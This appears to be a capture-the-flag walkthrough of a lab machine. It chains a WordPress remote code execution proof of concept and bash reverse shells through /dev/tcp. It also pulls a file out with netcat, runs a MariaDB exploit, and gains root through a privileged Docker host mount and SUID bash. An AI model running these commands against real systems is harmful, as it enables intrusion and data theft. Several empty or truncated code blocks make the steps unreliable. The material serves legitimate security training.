```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.29
```

## Scan Results

### Findings

- **22/tcp** → SSH
- **80/tcp** → HTTP
- **443/tcp** → HTTPS / WordPress
- **3306/tcp** → MySQL/MariaDB, filtered externally
- **8080/tcp** → Node.js Express Content Review System

The HTTPS service identifies the domain: `wellplayed.nyx`

Add the domain to the local `/etc/hosts` file.

```bash
echo "192.168.1.29    wellplayed.nyx" | sudo tee -a /etc/hosts
```

# 💥 WP2Shell Vulnerability

Further investigation reveals that WordPress 6.9.4 is affected by the **WP2Shell** vulnerability chain.

The vulnerability chain is associated with:

```text
CVE-2026-63030
CVE-2026-60137
```

The vulnerability can lead to unauthenticated remote code execution and site takeover.

A proof-of-concept repository is available for the vulnerability.

Clone the repository:

```bash
git clone https://github.com/mcipekci/wp2shell.git
```

Move into the directory:

```bash
cd wp2shell
```

---

# 🧪 Verify the Vulnerability

Use the provided script to check whether the target is vulnerable.

```bash
python3 wp2shell.py https://wellplayed.nyx/ --check
```

## Result

```text
$ python3 wp2shell.py https://wellplayed.nyx/ --check                     
[+] VULNERABLE: confusion desync + author__not_in SQLi confirmed via in-band UNION read (body reflected).
    RCE-capable (WordPress 6.9.0-7.0.1). Run with --exec / --dump to proceed.
```

The target is confirmed vulnerable.

---

# 🐚 Remote Command Execution

Test command execution using the `--exec` option.

```bash
python3 wp2shell.py https://wellplayed.nyx/ --exec "id ; whoami"
```

## Result

```text
[+] injectable via in-band UNION read (body reflected)

```

Command execution is successful, and the commands execute as: `www-data`


---

# 📡 Reverse Shell

Start a Netcat listener on the attacker machine.

```bash
nc -lnvp 9999
```

Execute a Bash reverse shell through the WP2Shell command execution functionality.

```bash
python3 wp2shell.py https://wellplayed.nyx/ --exec "bash -c 'bash -i > /dev/tcp/192.168.1.28/9999 0>&1'"
```

The listener receives a connection.

```text

www-data
```

A reverse shell is successfully obtained.

---

# 🖥 Shell Upgrade

Upgrade the reverse shell to a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then run:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The reverse shell is now upgraded to an interactive TTY.

---

# 🔍 Sensitive File Discovery

Search the `/opt` directory for interesting files.

```bash
cd /opt/ ls -la
```

## Result

```text
www-data@wellplayed:$ ls -la /opt/
total 20
drwxr-xr-x   4 root root 4096 Aug 10 12:22 .

-rw-r--r--   1 root root  396 Aug 10 12:22 secure.txt.xz
```

The file: `/opt/secure.txt.xz` looks interesting.

Attempt to decompress it directly:

```bash
unxz secure.txt.xz
```

## Result

```text
www-data@wellplayed:/opt$ unxz secure.txt.xz 
unxz: secure.txt: Permission denied
www-data@wellplayed:/opt$ 
```

The current user cannot write the decompressed file in `/opt`.

---

# 📥 Transfer the Compressed File

Transfer `secure.txt.xz` to the attacker machine using Netcat.

On the attacker machine:

```bash
nc -lnvp 4444 > secure.txt.xz
```

On the target:

```bash
nc 192.168.1.29 4444 < secure.txt.xz
```

After obtaining the file, decompress it locally and read its contents.

```bash
cat secure.txt
```

## Result

# 💥 MariaDB Privilege Escalation

Further investigation reveals a vulnerability affecting MariaDB 13.0.1.

The exploitation requires:

- A low-privileged MariaDB account
- A database controlled by that account
- The vulnerable MariaDB version
- Access to the MariaDB service

A proof-of-concept is available from:

```text

# 👤 Create a Low-Privileged Database User

Inside the MariaDB shell, create a low-privileged user.

```sql
create user 'lowpriv'@'%' identified by 'lowpriv';
```

Create the application database:

```sql
create database appdb;
```

Grant the required privileges:

```sql
grant usage on *.* to 'lowpriv'@'%';
```

```sql
grant all on appdb.* to 'lowpriv'@'%';
```

The required database configuration is now prepared.

# 📥 Download the MariaDB Exploit

Download the proof-of-concept exploit script.

```bash

```

---

# 📡 Prepare the Reverse Shell

Open another SSH session as `maciiii`.

On the second SSH session, start a Netcat listener:

```bash
nc -lnvp 5555
```

The Docker container is running on the internal network.

The observed container IP is:

```text
172.18.0.2
```

The Docker host is reachable through:

```text
172.18.0.1
```

---

# 🐚 Exploit MariaDB

From the first SSH session, execute the MariaDB proof-of-concept with a reverse-shell command.

```bash
python3 exploit_pure_sql.py --host 172.18.0.2 --port 3306 --user lowpriv --password lowpriv --command 'bash -c "bash -i >& /dev/tcp/172.18.0.1/5555 0>&1"' --marker /tmp/pwned
```

The second SSH session receives the connection.

```text

mysql@4d6a37e7cb75:~$
```

We successfully obtain a shell inside the MariaDB container as: `mysql`

---

# 🐳 Docker Enumeration

List the contents of the MySQL user's home directory.

```bash
ls -la
```

An interesting file is present:

```text

Read it:

```bash
cat .bash_history
```

## Result

```text
mysql@4d6a37e7cb75:~$ cat .bash_history
cat .bash_history
docker -H unix:///var/run/docker.sock.lol run --rm --privileged --pid=host --volume /:/host ubuntu:22.04 cat /host/root/root.txt
apt-get update
ip a
exit
ls
docker
exit
mysql@4d6a37e7cb75:~$ 
```

The history reveals a Docker command using:

```text
--privileged
--pid=host
--volume /:/host
```

This combination provides highly privileged access to the host filesystem.

The entire host filesystem is mounted inside the container at:

```text
/host
```

---

# 🔐 Check Bash Permissions

Before exploiting the Docker configuration, check the permissions of `/bin/bash` on the initial ssh session.

```bash
ls -la /bin/bash
```

## Result

```text
maciiii@wellplayed:~$  ls -la /bin/bash
-rwxr-xr-x 1 root root 1540520 Feb 13  2026 /bin/bash
```

The SUID bit is not currently set.

---

# 💥 Docker Privilege Escalation

Use the privileged Docker configuration to modify the host's `/bin/bash`.

From the MariaDB container shell, execute:

```bash
docker -H unix:///var/run/docker.sock.lol run --rm --privileged --pid=host --volume /:/host ubuntu:22.04 chmod u+s /host/bin/bash
```

The command starts a privileged container and mounts the host filesystem:

```text
/:/host
```

The command then changes the SUID permission of the host's Bash binary.

---

# 🔎 Verify SUID Bash

Return to the `maciiii` SSH session and check `/bin/bash` again.

```bash
ls -la /bin/bash
```

## Result

```text
maciiii@wellplayed:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1298416 May  9 06:07 /bin/bash
```

The SUID bit is now enabled:

```text
-rwsr-xr-x
```

The Bash binary is owned by root and has the SUID permission.

---

# 👑 Root Shell

Execute Bash with the `-p` option to preserve the effective privileges.

```bash
/bin/bash -p
```

## Result

```text
maciiii@wellplayed:~$ /bin/bash -p
bash-5.2# id
uid=1000(maciiii) gid=1000(maciiii) euid=0(root) groups=1000(maciiii)
bash-5.2# id ;whoami
uid=1000(maciiii) gid=1000(maciiii) euid=0(root) groups=1000(maciiii)
root
bash-5.2# 
```

The effective UID is:

```text
euid=0(root)
```

This confirms successful privilege escalation to root.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text

# 🚀 Key Takeaways

- Always enumerate all exposed services, especially when multiple web applications are running on different ports.
- WordPress version enumeration can reveal potentially vulnerable software versions.
- Unauthenticated remote code execution vulnerabilities can provide immediate access to the underlying web server account.
- Sensitive files such as configuration files and internal security memos can expose valid credentials.
- Database services should not expose unnecessary privileged functionality to low-privileged users.
- Privileged Docker containers can provide direct access to the host filesystem.
- Mounting `/` into a privileged container effectively exposes the host filesystem to the container.
- The SUID bit on `/bin/bash` allows an unprivileged account to execute Bash with root effective privileges.
- Docker socket access must be carefully restricted because access to a privileged Docker daemon can result in complete host compromise.
